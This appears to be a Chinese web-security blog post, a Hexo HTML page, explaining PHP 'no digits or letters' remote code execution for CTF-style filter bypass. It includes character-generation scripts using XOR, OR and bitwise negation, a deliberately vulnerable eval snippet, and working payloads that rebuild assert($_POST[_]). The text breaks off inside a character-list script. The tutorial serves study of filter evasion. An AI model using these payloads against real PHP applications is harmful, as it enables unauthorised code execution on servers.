@@ -1,0 +1,1402 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <!-- title -->
+<!-- keywords -->
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Auran_Lu">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Auran_Lu">
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    <meta name="description" content="分享 Web渗透，ctf笔记等技术内容">
+    <meta name="description" content="[!Important] 无数字字母RCE核心思路：利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名并动态执行   [!Note] 综合脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525">
+<meta property="og:type" content="article">
+<meta property="og:title" content="无数字字母rce">
+<meta property="og:url" content="https://auranlu.cc/Auran_Lu/web%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/index.html">
+<meta property="og:site_name" content="Auran_Lu的技术博客">
+<meta property="og:description" content="[!Important] 无数字字母RCE核心思路：利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名并动态执行   [!Note] 综合脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-15T08:48:04.701Z">
+<meta property="article:author" content="Auran_Lu">
+<meta property="article:tag" content="无数字字母rce">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/VanGogh.ico">
+    <title>无数字字母rce · AuranLu&#39;s Blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .footer-fixed-btn,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(
+            -45deg,
+            #444 0,
+            #444 80px,
+            #333 80px,
+            #333 160px
+        );
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link id="stylesheet-fancybox" rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-base" rel="preload" href="/css/style.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link id="stylesheet-mobile" rel="preload" href="/css/mobile.css" as="style" onload="this.onload=null;this.rel='stylesheet';this.media='screen and (max-width: 960px)'">
+    <link id="stylesheet-theme-dark" rel="preload" href="/css/dark.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    <!-- 百度统计  -->
+    <!-- 谷歌统计  -->
+    <!-- Google tag (gtag.js) -->
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Auran_Lu的技术博客" type="application/atom+xml">
+</head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+        <body class="post-body">
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        <div class="header-sidebar-menu">
+            <div style="padding-left: 1px;">&#xe775;</div>
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href="/">AuranLu's Blog.</a>
+        </span>
+    </div>
+    <!-- toggle banner -->
+    <div class="banner">
+        <div class="blog-title header-element">
+            <a href="/">AuranLu&#39;s Blog.</a>
+        </div>
+        <div class="post-title header-element">
+            <a href="#" class="post-name">无数字字母rce</a>
+        </div>
+    </div>
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- donate button -->
+
+    <!-- back to top button -->
+    <div class="footer-fixed-btn footer-fixed-btn--hidden back-top">
+        <div>&#xe639;</div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="    height:50vh;
+">
+    <!-- 主页  -->
+    <!-- 404页  -->
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+                无数字字母rce
+            <!-- 404 -->
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            <!-- 404 -->
+        </p>
+        <!-- 文章页 meta -->
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                    <div class="post-intro-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="无数字字母rce">无数字字母rce</a>
+</div>
+
+                <!-- 文章字数统计 -->
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">6k</span>阅读时长: <span class="post-count reading-time">25 min</span></span>
+                    </div>
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2025/03/10</span>
+                    <!-- busuanzi -->
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" alt="loading">
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>[!Important]</p>
+<p>无数字字母RCE核心思路：利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名并动态执行</p>
+</blockquote>
+<blockquote>
+<p>[!Note]</p>
+<p>综合脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Y4tacker</span><br><span class="line"># @Date:   2020-11-21 20:31:22</span><br><span class="line">*/</span><br><span class="line">//或</span><br><span class="line">function orRce($par1, $par2)&#123;</span><br><span class="line">    $result = (urldecode($par1)|urldecode($par2));</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//异或</span><br><span class="line">function xorRce($par1, $par2)&#123;</span><br><span class="line">    $result = (urldecode($par1)^urldecode($par2));</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//取反</span><br><span class="line">function negateRce()&#123;</span><br><span class="line">    fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"></span><br><span class="line">    $system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">    fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"></span><br><span class="line">    $command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">    echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//mode=1代表或，2代表异或，3代表取反</span><br><span class="line">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span><br><span class="line">function generate($mode, $preg=&#x27;/[0-9]/i&#x27;)&#123;</span><br><span class="line">    if ($mode!=3)&#123;</span><br><span class="line">        $myfile = fopen(&quot;rce.txt&quot;, &quot;w&quot;);</span><br><span class="line">        $contents = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">        for ($i=0;$i&lt;256;$i++)&#123;</span><br><span class="line">            for ($j=0;$j&lt;256;$j++)&#123;</span><br><span class="line">                if ($i&lt;16)&#123;</span><br><span class="line">                    $hex_i = &#x27;0&#x27;.dechex($i);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    $hex_i = dechex($i);</span><br><span class="line">                &#125;</span><br><span class="line">                if ($j&lt;16)&#123;</span><br><span class="line">                    $hex_j = &#x27;0&#x27;.dechex($j);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    $hex_j = dechex($j);</span><br><span class="line">                &#125;</span><br><span class="line">                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;</span><br><span class="line">                    echo &quot;&quot;;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    $par1 = &quot;%&quot;.$hex_i;</span><br><span class="line">                    $par2 = &#x27;%&#x27;.$hex_j;</span><br><span class="line">                    $res = &#x27;&#x27;;</span><br><span class="line">                    if ($mode==1)&#123;</span><br><span class="line">                        $res = orRce($par1, $par2);</span><br><span class="line">                    &#125;else if ($mode==2)&#123;</span><br><span class="line">                        $res = xorRce($par1, $par2);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    if (ord($res)&gt;=32&amp;ord($res)&lt;=126)&#123;</span><br><span class="line">                        $contents=$contents.$res.&quot; &quot;.$par1.&quot; &quot;.$par2.&quot;\n&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        fwrite($myfile,$contents);</span><br><span class="line">        fclose($myfile);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        negateRce();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">generate(1,&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;);</span><br><span class="line">//1代表模式，后面的是过滤规则</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h1 id="一.异或">一.异或<code>^</code></h1>
+<p>php按位异或原理：在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310191021830.png"
+alt="image-20250310191021830" />
+<figcaption aria-hidden="true">image-20250310191021830</figcaption>
+</figure>
+<h1 id="二.取反">二.取反<code>~</code></h1>
+<blockquote>
+<p>[!NOTE]</p>
+<p>取反万能计算公式 <span class="math display">\[
+~x = -(x+1);
+\]</span></p>
+</blockquote>
+<p>计算过程</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    System.out.println(~<span class="number">4</span>);</span><br><span class="line">    <span class="comment">//补码: 0 100</span></span><br><span class="line">    <span class="comment">//取反: 1 011</span></span><br><span class="line">    <span class="comment">//反码: 1 010</span></span><br><span class="line">    <span class="comment">//原码: 1 101 = -5</span></span><br><span class="line">    System.out.println(~(-<span class="number">4</span>));</span><br><span class="line">    <span class="comment">//1 100</span></span><br><span class="line">    <span class="comment">//1 011</span></span><br><span class="line">    <span class="comment">//补码: 1 100</span></span><br><span class="line">    <span class="comment">//取反: 0 011</span></span><br><span class="line">    <span class="comment">//原码: 0 011 = 3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="场景1">场景1</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code = $_GET[&#x27;code&#x27;];</span><br><span class="line">if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">    die(&quot;hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">@eval($code);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="法一">法一</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a=urlencode(~(&#x27;assert&#x27;));</span><br><span class="line">$b=urlencode(~(&#x27;_POST&#x27;));</span><br><span class="line">echo $a.&#x27;\n&#x27;;</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>此时<span
+class="math inline">\(a为`%9E%8C%8C%9A%8D%8B`,\)</span>b为<code>%A0%AF%B0%AC%AB</code>,构造payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~(%9E%8C%8C%9A%8D%8B)($_~(%A0%AF%B0%AC%AB)[_])</span><br><span class="line">即$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[_]);</span><br></pre></td></tr></table></figure>
+<h3 id="法二">法二</h3>
+<p>UTF-8汉字取反字符集生成脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">$shell = &quot;assert&quot;;</span><br><span class="line">$result = &quot;&quot;;</span><br><span class="line">$arr =array();</span><br><span class="line">$word = &quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span><br><span class="line">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span><br><span class="line">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span><br><span class="line">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span><br><span class="line">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span><br><span class="line">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span><br><span class="line">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span><br><span class="line">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span><br><span class="line">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span><br><span class="line">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span><br><span class="line">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span><br><span class="line">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span><br><span class="line">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span><br><span class="line">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span><br><span class="line">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span><br><span 